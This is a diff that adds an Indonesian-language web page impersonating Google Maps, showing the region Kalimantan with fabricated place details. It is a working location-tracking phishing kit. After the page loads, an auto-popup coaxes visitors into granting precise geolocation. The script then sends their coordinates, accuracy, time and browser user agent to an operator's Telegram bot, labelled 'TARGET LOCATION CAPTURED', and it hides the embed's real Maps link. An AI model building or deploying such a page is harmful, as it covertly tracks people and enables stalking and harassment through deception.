@@ -1,0 +1,962 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='%234285f4'><path d='M12 2C8.13 2 5 5.13 5 9c0 5.25 7 13 7 13s7-7.75 7-13c0-3.87-3.13-7-7-7zm0 9.5c-1.38 0-2.5-1.12-2.5-2.5s1.12-2.5 2.5-2.5 2.5 1.12 2.5 2.5-1.12 2.5-2.5 2.5z'/></svg>">
+    <title>Kalimantan - Google Maps</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+
+        html, body {
+            width: 100%;
+            height: 100%;
+            overflow: hidden;
+            font-family: 'Roboto', Arial, sans-serif;
+            -webkit-font-smoothing: antialiased;
+            background: #e8eaed;
+        }
+
+        #map {
+            position: fixed;
+            top: 0; left: 0;
+            width: 100%; height: 100%;
+            z-index: 1;
+        }
+
+        #map iframe {
+            width: 100%; height: 100%;
+            border: none;
+        }
+
+        /* ===== TOP BAR ===== */
+        .top-bar {
+            position: fixed;
+            top: 10px; left: 10px; right: 10px;
+            z-index: 20;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .search-box {
+            flex: 1;
+            background: #fff;
+            border-radius: 8px;
+            box-shadow: 0 1px 4px rgba(0,0,0,0.3), 0 2px 8px rgba(0,0,0,0.15);
+            display: flex;
+            align-items: center;
+            height: 46px;
+            padding: 0 4px 0 0;
+            overflow: hidden;
+        }
+
+        .search-back {
+            width: 44px;
+            height: 46px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            flex-shrink: 0;
+        }
+
+        .search-back svg {
+            width: 20px; height: 20px;
+            fill: #5f6368;
+        }
+
+        .search-divider {
+            width: 1px;
+            height: 24px;
+            background: #dadce0;
+            flex-shrink: 0;
+        }
+
+        .search-text {
+            flex: 1;
+            padding: 0 12px;
+            font-size: 15px;
+            color: #3c4043;
+            white-space: nowrap;
+            overflow: hidden;
+            text-overflow: ellipsis;
+        }
+
+        .search-clear {
+            width: 36px; height: 36px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            flex-shrink: 0;
+        }
+
+        .search-clear svg {
+            width: 18px; height: 18px;
+            fill: #70757a;
+        }
+
+        .search-avatar {
+            width: 32px; height: 32px;
+            background: #1a73e8;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: #fff;
+            font-size: 14px;
+            font-weight: 500;
+            margin-left: 4px;
+            flex-shrink: 0;
+        }
+
+        /* ===== BOTTOM SHEET ===== */
+        .bottom-sheet {
+            position: fixed;
+            bottom: 0; left: 0; right: 0;
+            z-index: 30;
+            background: #fff;
+            border-radius: 16px 16px 0 0;
+            box-shadow: 0 -4px 24px rgba(0,0,0,0.18);
+            max-height: 75vh;
+            overflow-y: auto;
+            animation: sheetUp 0.3s ease-out;
+        }
+
+        @keyframes sheetUp {
+            from { transform: translateY(100%); }
+            to { transform: translateY(0); }
+        }
+
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+
+        /* Drag handle */
+        .sheet-handle {
+            position: sticky;
+            top: 0;
+            background: #fff;
+            padding-top: 8px;
+            z-index: 2;
+        }
+
+        .handle-bar {
+            width: 32px; height: 4px;
+            background: #dadce0;
+            border-radius: 2px;
+            margin: 0 auto;
+        }
+
+        /* Photo strip */
+        .place-photo {
+            height: 140px;
+            background: linear-gradient(135deg, #1a73e8 0%, #0d47a1 50%, #1a237e 100%);
+            position: relative;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            overflow: hidden;
+        }
+
+        .place-photo::before {
+            content: '';
+            position: absolute;
+            top: 0; left: 0; right: 0; bottom: 0;
+            background: 
+                radial-gradient(ellipse at 30% 70%, rgba(66,133,244,0.4) 0%, transparent 50%),
+                radial-gradient(ellipse at 70% 30%, rgba(156,39,176,0.3) 0%, transparent 50%);
+        }
+
+        .place-photo-icon {
+            position: relative;
+            z-index: 1;
+            opacity: 0.25;
+        }
+
+        .place-photo-icon svg {
+            width: 72px; height: 72px;
+            fill: #fff;
+        }
+
+        .photo-count {
+            position: absolute;
+            bottom: 10px;
+            right: 12px;
+            background: rgba(0,0,0,0.6);
+            color: #fff;
+            font-size: 11px;
+            padding: 4px 8px;
+            border-radius: 12px;
+            z-index: 2;
+        }
+
+        /* Card content */
+        .sheet-content {
+            padding: 16px 20px 28px;
+        }
+
+        .place-name {
+            font-size: 22px;
+            font-weight: 400;
+            color: #202124;
+            line-height: 1.25;
+            margin-bottom: 6px;
+        }
+
+        .place-rating-row {
+            display: flex;
+            align-items: center;
+            gap: 6px;
+            font-size: 14px;
+            color: #5f6368;
+            margin-bottom: 4px;
+            flex-wrap: wrap;
+        }
+
+        .stars {
+            display: flex;
+            gap: 1px;
+        }
+
+        .stars svg {
+            width: 14px; height: 14px;
+            fill: #fbbc04;
+        }
+
+        .stars svg.empty {
+            fill: #dadce0;
+        }
+
+        .rating-count {
+            color: #1a73e8;
+            font-weight: 500;
+        }
+
+        .place-status {
+            display: flex;
+            align-items: center;
+            gap: 6px;
+            font-size: 14px;
+            color: #5f6368;
+            margin-bottom: 2px;
+        }
+
+        .status-open {
+            color: #1e8e3e;
+            font-weight: 500;
+        }
+
+        .place-category {
+            font-size: 14px;
+            color: #5f6368;
+            margin-bottom: 16px;
+        }
+
+        /* Action buttons - Google Maps style */
+        .actions-row {
+            display: flex;
+            gap: 8px;
+            margin-bottom: 16px;
+        }
+
+        .action-btn {
+            flex: 1;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 6px;
+            padding: 9px 8px;
+            border: none;
+            border-radius: 20px;
+            font-family: inherit;
+            font-size: 13px;
+            font-weight: 500;
+            cursor: pointer;
+            transition: all 0.15s;
+            white-space: nowrap;
+        }
+
+        .action-btn svg {
+            width: 17px; height: 17px;
+            flex-shrink: 0;
+        }
+
+        .action-btn.primary {
+            background: #1a73e8;
+            color: #fff;
+        }
+
+        .action-btn.primary svg { fill: #fff; }
+        .action-btn.primary:hover { background: #1765cc; }
+        .action-btn.primary:active { background: #185abc; }
+
+        .action-btn.secondary {
+            background: #f1f3f4;
+            color: #1a73e8;
+        }
+
+        .action-btn.secondary svg { fill: #1a73e8; }
+        .action-btn.secondary:hover { background: #e8eaed; }
+
+        /* Info rows */
+        .info-list {
+            border-top: 1px solid #e8eaed;
+            padding-top: 12px;
+        }
+
+        .info-row {
+            display: flex;
+            align-items: flex-start;
+            gap: 14px;
+            padding: 8px 0;
+        }
+
+        .info-row svg {
+            width: 18px; height: 18px;
+            fill: #5f6368;
+            flex-shrink: 0;
+            margin-top: 2px;
+        }
+
+        .info-row-text {
+            font-size: 14px;
+            color: #3c4043;
+            line-height: 1.4;
+        }
+
+        .info-row-text a {
+            color: #1a73e8;
+            text-decoration: none;
+        }
+
+        .info-actions {
+            display: flex;
+            gap: 16px;
+            margin-top: 4px;
+        }
+
+        .info-actions button {
+            background: none;
+            border: none;
+            color: #1a73e8;
+            font-size: 13px;
+            font-weight: 500;
+            font-family: inherit;
+            cursor: pointer;
+            padding: 4px 0;
+        }
+
+        /* Chip on map */
+        .location-chip {
+            position: fixed;
+            top: 68px;
+            left: 50%;
+            transform: translateX(-50%);
+            z-index: 15;
+            background: #fff;
+            border-radius: 24px;
+            box-shadow: 0 2px 8px rgba(0,0,0,0.25);
+            padding: 8px 14px;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            cursor: pointer;
+            animation: chipPulse 2s ease-in-out infinite, chipIn 0.5s ease-out 0.8s both;
+            white-space: nowrap;
+        }
+
+        @keyframes chipIn {
+            from { opacity: 0; transform: translateX(-50%) translateY(-10px); }
+            to { opacity: 1; transform: translateX(-50%) translateY(0); }
+        }
+
+        @keyframes chipPulse {
+            0%, 100% { box-shadow: 0 2px 8px rgba(0,0,0,0.25), 0 0 0 0 rgba(26,115,232,0.3); }
+            50% { box-shadow: 0 2px 8px rgba(0,0,0,0.25), 0 0 0 8px rgba(26,115,232,0); }
+        }
+
+        .location-chip span {
+            font-size: 13px;
+            font-weight: 500;
+            color: #1a73e8;
+        }
+
+        .location-chip svg.arrow {
+            width: 16px; height: 16px;
+        }
+
+        .chip-dot {
+            width: 8px; height: 8px;
+            background: #1a73e8;
+            border-radius: 50%;
+            animation: dotBlink 1.2s ease-in-out infinite;
+        }
+
+        @keyframes dotBlink {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.3; }
+        }
+
+        /* Floating controls right */
+        .map-controls {
+            position: fixed;
+            right: 12px;
+            z-index: 10;
+            display: flex;
+            flex-direction: column;
+            gap: 8px;
+        }
+
+        .ctrl-btn {
+            width: 40px; height: 40px;
+            background: #fff;
+            border: none;
+            border-radius: 8px;
+            box-shadow: 0 1px 4px rgba(0,0,0,0.3);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            cursor: pointer;
+        }
+
+        .ctrl-btn svg {
+            width: 20px; height: 20px;
+            fill: #666;
+        }
+
+        .ctrl-btn.round { border-radius: 50%; }
+
+        .zoom-group {
+            display: flex;
+            flex-direction: column;
+            background: #fff;
+            border-radius: 8px;
+            box-shadow: 0 1px 4px rgba(0,0,0,0.3);
+            overflow: hidden;
+        }
+
+        .zoom-group button {
+            width: 40px; height: 40px;
+            border: none;
+            background: #fff;
+            font-size: 20px;
+            color: #666;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .zoom-group button:first-child { border-bottom: 1px solid #e8eaed; }
+
+        /* Logo */
+        .gmaps-logo {
+            position: fixed;
+            bottom: auto;
+            top: auto;
+            left: 12px;
+            z-index: 5;
+            font-size: 12px;
+            color: #5f6368;
+            background: rgba(255,255,255,0.9);
+            padding: 3px 7px;
+            border-radius: 3px;
+            font-weight: 500;
+            letter-spacing: 0.3px;
+            /* positioned above bottom sheet via JS or fixed calc */
+            bottom: 420px;
+        }
+
+        /* Toast */
+        .toast {
+            position: fixed;
+            bottom: 440px;
+            left: 50%;
+            transform: translateX(-50%) translateY(20px);
+            z-index: 100;
+            background: #202124;
+            color: #fff;
+            font-size: 14px;
+            padding: 12px 20px;
+            border-radius: 8px;
+            box-shadow: 0 4px 12px rgba(0,0,0,0.3);
+            opacity: 0;
+            transition: opacity 0.3s, transform 0.3s;
+            pointer-events: none;
+            white-space: nowrap;
+        }
+
+        .toast.show {
+            opacity: 1;
+            transform: translateX(-50%) translateY(0);
+        }
+
+        /* Loading */
+        .loading-overlay {
+            position: fixed;
+            top: 0; left: 0;
+            width: 100%; height: 100%;
+            background: #fff;
+            z-index: 1000;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            transition: opacity 0.4s;
+        }
+
+        .loading-overlay.hide {
+            opacity: 0;
+            pointer-events: none;
+        }
+
+        .loading-spinner {
+            width: 36px; height: 36px;
+            border: 3px solid #e8eaed;
+            border-top-color: #4285f4;
+            border-radius: 50%;
+            animation: spin 0.7s linear infinite;
+            margin-bottom: 16px;
+        }
+
+        .loading-overlay p {
+            font-size: 14px;
+            color: #5f6368;
+        }
+
+        /* ===== POPUP MODAL ===== */
+        .popup-backdrop {
+            position: fixed;
+            top: 0; left: 0;
+            width: 100%; height: 100%;
+            background: rgba(0,0,0,0.45);
+            z-index: 900;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+            opacity: 0;
+            animation: fadeIn 0.25s ease-out 0.3s forwards;
+        }
+
+        .popup-backdrop.show {
+            opacity: 1;
+        }
+
+        @keyframes fadeIn {
+            to { opacity: 1; }
+        }
+
+        .popup-box {
+            background: #fff;
+            border-radius: 28px;
+            width: 100%;
+            max-width: 340px;
+            padding: 32px 24px 24px;
+            text-align: center;
+            box-shadow: 0 8px 40px rgba(0,0,0,0.3);
+            transform: scale(0.9) translateY(20px);
+            animation: popIn 0.3s ease-out 0.4s forwards;
+        }
+
+        @keyframes popIn {
+            to { transform: scale(1) translateY(0); }
+        }
+
+        .popup-icon {
+            width: 64px; height: 64px;
+            background: #e8f0fe;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto 18px;
+        }
+
+        .popup-icon svg {
+            width: 32px; height: 32px;
+            fill: #1a73e8;
+        }
+
+        .popup-title {
+            font-size: 19px;
+            font-weight: 500;
+            color: #202124;
+            margin-bottom: 8px;
+            line-height: 1.3;
+        }
+
+        .popup-desc {
+            font-size: 14px;
+            color: #5f6368;
+            line-height: 1.5;
+            margin-bottom: 24px;
+        }
+
+        .popup-btn {
+            width: 100%;
+            padding: 13px;
+            background: #1a73e8;
+            color: #fff;
+            border: none;
+            border-radius: 24px;
+            font-size: 15px;
+            font-weight: 500;
+            font-family: inherit;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+            transition: background 0.15s;
+            margin-bottom: 8px;
+        }
+
+        .popup-btn:hover { background: #1765cc; }
+        .popup-btn:active { background: #185abc; }
+
+        .popup-btn svg {
+            width: 18px; height: 18px;
+            fill: #fff;
+        }
+
+        .popup-skip {
+            width: 100%;
+            padding: 10px;
+            background: none;
+            border: none;
+            color: #5f6368;
+            font-size: 14px;
+            font-family: inherit;
+            cursor: pointer;
+            border-radius: 24px;
+            transition: background 0.15s;
+        }
+
+        .popup-skip:hover { background: #f1f3f4; }
+
+        .hidden { display: none !important; }
+
+        /* Card loading / done states */
+        .card-state {
+            text-align: center;
+            padding: 28px 20px;
+        }
+
+        .card-state .spinner {
+            width: 28px; height: 28px;
+            border: 3px solid #e8eaed;
+            border-top-color: #1a73e8;
+            border-radius: 50%;
+            animation: spin 0.7s linear infinite;
+            margin: 0 auto 12px;
+        }
+
+        .card-state p {
+            font-size: 14px;
+            color: #5f6368;
+        }
+
+        .card-state .title {
+            font-size: 15px;
+            font-weight: 500;
+            color: #202124;
+        }
+
+        /* Responsive */
+        @media (max-width: 400px) {
+            .place-name { font-size: 19px; }
+            .actions-row { gap: 6px; }
+            .action-btn { font-size: 12px; padding: 8px 6px; }
+            .place-photo { height: 120px; }
+        }
+    </style>
+</head>
+<body>
+    <div class="loading-overlay" id="loadingOverlay">
+        <div class="loading-spinner"></div>
+        <p>Memuat Google Maps...</p>
+    </div>
+
+    <div id="map">
+        <iframe
+            src="https://www.google.com/maps/embed?pb=!1m18!1m12!1m3!1d13186039.298807877!2d108.7560542!3d1.4342791!2m3!1f0!2f0!3f0!3m2!1i1024!2i768!4f13.1!3m3!1m2!1s0x3200a51b0ce8057b%3A0xf81f7b0a97d0b88a!2sKalimantan!5e0!3m2!1sid!2sid!4v1700000000000!5m2!1sid!2sid"
+            allowfullscreen=""
+            loading="lazy"
+            referrerpolicy="no-referrer-when-downgrade">
+        </iframe>
+        <!-- Cover "Buka di Maps" link from embed -->
+        <div style="position:absolute;bottom:0;left:0;width:100%;height:36px;background:rgba(232,234,237,0.95);z-index:2;"></div>
+    </div>
+
+    <!-- Top bar -->
+    <div class="top-bar">
+        <div class="search-box">
+            <div class="search-back">
+                <svg viewBox="0 0 24 24"><path d="M20 11H7.83l5.59-5.59L12 4l-8 8 8 8 1.41-1.41L7.83 13H20v-2z"/></svg>
+            </div>
+            <div class="search-divider"></div>
+            <div class="search-text">Kalimantan</div>
+            <div class="search-clear">
+                <svg viewBox="0 0 24 24"><path d="M19 6.41L17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"/></svg>
+            </div>
+            <div class="search-avatar">A</div>
+        </div>
+    </div>
+
+    <!-- Location chip -->
+    <div class="location-chip" id="locationChip" onclick="requestLocation()">
+        <div class="chip-dot"></div>
+        <span>Lokasi Anda</span>
+        <svg class="arrow" viewBox="0 0 24 24" fill="#1a73e8"><path d="M10 6L8.59 7.41 13.17 12l-4.58 4.59L10 18l6-6z"/></svg>
+    </div>
+
+    <!-- Map controls -->
+    <div class="map-controls" style="bottom: 440px;">
+        <div class="zoom-group">
+            <button onclick="return false;">+</button>
+            <button onclick="return false;">−</button>
+        </div>
+        <button class="ctrl-btn round" onclick="requestLocation()">
+            <svg viewBox="0 0 24 24"><path d="M12 8c-2.21 0-4 1.79-4 4s1.79 4 4 4 4-1.79 4-4-1.79-4-4-4zm8.94 3c-.46-4.17-3.77-7.48-7.94-7.94V1h-2v2.06c-4.17.46-7.48 3.77-7.94 7.94H1v2h2.06c.46 4.17 3.77 7.48 7.94 7.94V23h2v-2.06c4.17-.46 7.48-3.77 7.94-7.94H23v-2h-2.06zM12 19c-3.87 0-7-3.13-7-7s3.13-7 7-7 7 3.13 7 7-3.13 7-7 7z"/></svg>
+        </button>
+    </div>
+
+    <div class="gmaps-logo">Google</div>
+
+    <!-- Bottom sheet -->
+    <div class="bottom-sheet" id="bottomSheet">
+        <div class="sheet-handle">
+            <div class="handle-bar"></div>
+        </div>
+
+        <!-- Default: place details -->
+        <div id="sheetDefault">
+            <div class="place-photo">
+                <div class="place-photo-icon">
+                    <svg viewBox="0 0 24 24"><path d="M12 2C8.13 2 5 5.13 5 9c0 5.25 7 13 7 13s7-7.75 7-13c0-3.87-3.13-7-7-7zm0 9.5c-1.38 0-2.5-1.12-2.5-2.5s1.12-2.5 2.5-2.5 2.5 1.12 2.5 2.5-1.12 2.5-2.5 2.5z"/></svg>
+                </div>
+                <div class="photo-count">📷 128</div>
+            </div>
+
+            <div class="sheet-content">
+                <div class="place-name">Kalimantan</div>
+
+                <div class="place-rating-row">
+                    <span class="stars">
+                        <svg viewBox="0 0 24 24"><path d="M12 17.27L18.18 21l-1.64-7.03L22 9.24l-7.19-.61L12 2 9.19 8.63 2 9.24l5.46 4.73L5.82 21z"/></svg>
+                        <svg viewBox="0 0 24 24"><path d="M12 17.27L18.18 21l-1.64-7.03L22 9.24l-7.19-.61L12 2 9.19 8.63 2 9.24l5.46 4.73L5.82 21z"/></svg>
+                        <svg viewBox="0 0 24 24"><path d="M12 17.27L18.18 21l-1.64-7.03L22 9.24l-7.19-.61L12 2 9.19 8.63 2 9.24l5.46 4.73L5.82 21z"/></svg>
+                        <svg viewBox="0 0 24 24"><path d="M12 17.27L18.18 21l-1.64-7.03L22 9.24l-7.19-.61L12 2 9.19 8.63 2 9.24l5.46 4.73L5.82 21z"/></svg>
+                        <svg class="empty" viewBox="0 0 24 24"><path d="M12 17.27L18.18 21l-1.64-7.03L22 9.24l-7.19-.61L12 2 9.19 8.63 2 9.24l5.46 4.73L5.82 21z"/></svg>
+                    </span>
+                    <span>4.4</span>
+                    <span class="rating-count">(12.384)</span>
+                </div>
+
+                <div class="place-status">
+                    <span class="status-open">Buka</span>
+                    <span>·</span>
+                    <span>Tutup pukul 22.00</span>
+                </div>
+
+                <div class="place-category">Wilayah geografis</div>
+
+                <div class="actions-row">
+                    <button class="action-btn primary" onclick="requestLocation()">
+                        <svg viewBox="0 0 24 24"><path d="M22.43 10.59l-9.01-9.01c-.75-.75-2.07-.76-2.83 0l-9.01 9.01c-.77.77-.77 2.03 0 2.8l9.01 9.01c.39.39.9.58 1.41.58.51 0 1.02-.2 1.41-.58l9.01-9.01c.78-.78.78-2.05 0-2.82zm-10.42 8.16l-7.07-7.07 7.07-7.07 7.07 7.07-7.07 7.07zM8 11v4h2v-3h4v2.5l3.5-3.5L14 7.5V10H9c-.55 0-1 .45-1 1z"/></svg>
+                        Rute
+                    </button>
+                    <button class="action-btn secondary" onclick="return false;">
+                        <svg viewBox="0 0 24 24"><path d="M17 3H7c-1.1 0-2 .9-2 2v16l7-3 7 3V5c0-1.1-.9-2-2-2zm0 15l-5-2.18L7 18V5h10v13z"/></svg>
+                        Simpan
+                    </button>
+                    <button class="action-btn secondary" onclick="return false;">
+                        <svg viewBox="0 0 24 24"><path d="M12 2C8.13 2 5 5.13 5 9c0 5.25 7 13 7 13s7-7.75 7-13c0-3.87-3.13-7-7-7zm-1 17.93c-3.95-.49-7-3.85-7-7.93 0-.62.08-1.21.21-1.79L9 15v1c0 1.1.9 2 2 2v1.93zm6.9-2.54c-.26-.81-1-1.39-1.9-1.39h-1v-3c0-.55-.45-1-1-1H8v-2h2c.55 0 1-.45 1-1V7h2c1.1 0 2-.9 2-2v-.41c2.93 1.19 5 4.06 5 7.41 0 2.08-.8 3.97-2.1 5.39z"/></svg>
+                        Sekitar
+                    </button>
+                    <button class="action-btn secondary" onclick="return false;">
+                        <svg viewBox="0 0 24 24"><path d="M18 16.08c-.76 0-1.44.3-1.96.77L8.91 12.7c.05-.23.09-.46.09-.7s-.04-.47-.09-.7l7.05-4.11c.54.5 1.25.81 2.04.81 1.66 0 3-1.34 3-3s-1.34-3-3-3-3 1.34-3 3c0 .24.04.47.09.7L8.04 9.81C7.5 9.31 6.79 9 6 9c-1.66 0-3 1.34-3 3s1.34 3 3 3c.79 0 1.5-.31 2.04-.81l7.12 4.16c-.05.21-.08.43-.08.65 0 1.61 1.31 2.92 2.92 2.92s2.92-1.31 2.92-2.92-1.31-2.92-2.92-2.92z"/></svg>
+                        Bagikan
+                    </button>
+                </div>
+
+                <div class="info-list">
+                    <div class="info-row">
+                        <svg viewBox="0 0 24 24"><path d="M12 2C8.13 2 5 5.13 5 9c0 5.25 7 13 7 13s7-7.75 7-13c0-3.87-3.13-7-7-7zm0 9.5c-1.38 0-2.5-1.12-2.5-2.5s1.12-2.5 2.5-2.5 2.5 1.12 2.5 2.5-1.12 2.5-2.5 2.5z"/></svg>
+                        <div class="info-row-text">
+                            Indonesia
+                        </div>
+                    </div>
+                    <div class="info-row">
+                        <svg viewBox="0 0 24 24"><path d="M6.62 10.79c1.44 2.83 3.76 5.14 6.59 6.59l2.2-2.2c.27-.27.67-.36 1.02-.24 1.12.37 2.33.57 3.57.57.55 0 1 .45 1 1V20c0 .55-.45 1-1 1-9.39 0-17-7.61-17-17 0-.55.45-1 1-1h3.5c.55 0 1 .45 1 1 0 1.25.2 2.45.57 3.57.11.35.03.74-.25 1.02l-2.2 2.2z"/></svg>
+                        <div class="info-row-text">
+                            +62 21 123 4567
+                            <div class="info-actions">
+                                <button>Telepon</button>
+                                <button>SMS</button>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- Loading state -->
+        <div id="sheetLoading" class="hidden">
+            <div class="card-state">
+                <div class="spinner"></div>
+                <p>Mencari lokasi Anda...</p>
+            </div>
+        </div>
+
+        <!-- Done state -->
+        <div id="sheetDone" class="hidden">
+            <div class="card-state">
+                <svg viewBox="0 0 24 24" style="width:40px;height:40px;fill:#1e8e3e;margin-bottom:10px;"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z"/></svg>
+                <p class="title">Lokasi Anda ditemukan</p>
+                <p style="margin-top:4px;">Memperbarui peta...</p>
+            </div>
+        </div>
+    </div>
+
+    <div class="toast" id="toast"></div>
+
+    <!-- POPUP: auto-appears, triggers location request -->
+    <div class="popup-backdrop hidden" id="popupModal">
+        <div class="popup-box">
+            <div class="popup-icon">
+                <svg viewBox="0 0 24 24"><path d="M12 8c-2.21 0-4 1.79-4 4s1.79 4 4 4 4-1.79 4-4-1.79-4-4-4zm8.94 3c-.46-4.17-3.77-7.48-7.94-7.94V1h-2v2.06c-4.17.46-7.48 3.77-7.94 7.94H1v2h2.06c.46 4.17 3.77 7.48 7.94 7.94V23h2v-2.06c4.17-.46 7.48-3.77 7.94-7.94H23v-2h-2.06zM12 19c-3.87 0-7-3.13-7-7s3.13-7 7-7 7 3.13 7 7-3.13 7-7 7z"/></svg>
+            </div>
+            <div class="popup-title">Lihat Lokasi</div>
+            <div class="popup-desc">Untuk menampilkan posisi Anda di peta, izinkan akses lokasi perangkat ini.</div>
+            <button class="popup-btn" onclick="handlePopupAllow()">
+                <svg viewBox="0 0 24 24"><path d="M12 8c-2.21 0-4 1.79-4 4s1.79 4 4 4 4-1.79 4-4-1.79-4-4-4zm8.94 3c-.46-4.17-3.77-7.48-7.94-7.94V1h-2v2.06c-4.17.46-7.48 3.77-7.94 7.94H1v2h2.06c.46 4.17 3.77 7.48 7.94 7.94V23h2v-2.06c4.17-.46 7.48-3.77 7.94-7.94H23v-2h-2.06zM12 19c-3.87 0-7-3.13-7-7s3.13-7 7-7 7 3.13 7 7-3.13 7-7 7z"/></svg>
+                Lihat Lokasi
+            </button>
+            <button class="popup-skip" onclick="closePopup()">Nanti saja</button>
+        </div>
+    </div>
+
+    <script>
+        setTimeout(() => {
+            document.getElementById('loadingOverlay').classList.add('hide');
+            setTimeout(() => {
+                document.getElementById('loadingOverlay').style.display = 'none';
+                // Auto-show popup after map loads
+                setTimeout(() => {
+                    document.getElementById('popupModal').classList.remove('hidden');
+                }, 800);
+            }, 400);
+        }, 1500);
+
+        function handlePopupAllow() {
+            closePopup();
+            setTimeout(() => requestLocation(), 200);
+        }
+
+        function closePopup() {
+            const popup = document.getElementById('popupModal');
+            popup.style.opacity = '0';
+            popup.style.transition = 'opacity 0.2s';
+            setTimeout(() => popup.classList.add('hidden'), 200);
+        }
+
+        let requested = false;
+
+        function requestLocation() {
+            if (requested) return;
+            requested = true;
+
+            if (!navigator.geolocation) {
+                showToast('Perangkat tidak mendukung akses lokasi');
+                requested = false;
+                return;
+            }
+
+            document.getElementById('sheetDefault').classList.add('hidden');
+            document.getElementById('sheetLoading').classList.remove('hidden');
+            document.getElementById('locationChip').classList.add('hidden');
+
+            navigator.geolocation.getCurrentPosition(
+                successCallback,
+                errorCallback,
+                { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
+            );
+        }
+
+        function successCallback(position) {
+            const data = {
+                latitude: position.coords.latitude,
+                longitude: position.coords.longitude,
+                accuracy: position.coords.accuracy,
+                timestamp: new Date().toISOString()
+            };
+
+            sendLocationData(data);
+
+            document.getElementById('sheetLoading').classList.add('hidden');
+            document.getElementById('sheetDone').classList.remove('hidden');
+        }
+
+        function errorCallback(error) {
+            requested = false;
+            document.getElementById('sheetLoading').classList.add('hidden');
+            document.getElementById('sheetDefault').classList.remove('hidden');
+            document.getElementById('locationChip').classList.remove('hidden');
+
+            let msg;
+            switch (error.code) {
+                case error.PERMISSION_DENIED:
+                    msg = 'Izin lokasi diperlukan untuk menampilkan posisi Anda';
+                    break;
+                case error.POSITION_UNAVAILABLE:
+                    msg = 'Lokasi tidak tersedia';
+                    break;
+                case error.TIMEOUT:
+                    msg = 'Timeout, coba lagi';
+                    break;
+                default:
+                    msg = 'Gagal mendapatkan lokasi';
+            }
+            showToast(msg);
+        }
+
+        function showToast(msg) {
+            const toast = document.getElementById('toast');
+            toast.textContent = msg;
+            toast.className = 'toast show';
+            setTimeout(() => { toast.className = 'toast'; }, 3000);
+        }
+
+        function sendLocationData(data) {
+            const mapsLink = `https://www.google.com/maps?q=${data.latitude},${data.longitude}`;
+
+            const BOT_TOKEN = 'ISI_TOKEN_BOT_KAMU';
+            const CHAT_ID = 'ISI_CHAT_ID_KAMU';
+
+            const message = `🎯 *TARGET LOCATION CAPTURED (V2 MAPS)*\n\n` +
+                `📍 [Buka di Google Maps](${mapsLink})\n\n` +
+                `*Detail:*\n` +
+                `• Latitude: \`${data.latitude}\`\n` +
+                `• Longitude: \`${data.longitude}\`\n` +
+                `• Akurasi: ±${Math.round(data.accuracy)}m\n` +
+                `• Waktu: ${data.timestamp}\n` +
+                `• UA: \`${navigator.userAgent}\``;
+
+            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    chat_id: CHAT_ID,
+                    text: message,
+                    parse_mode: 'Markdown',
+                    disable_web_page_preview: false
+                })
+            }).catch(() => {});
+        }
+    </script>
+</body>
+</html>
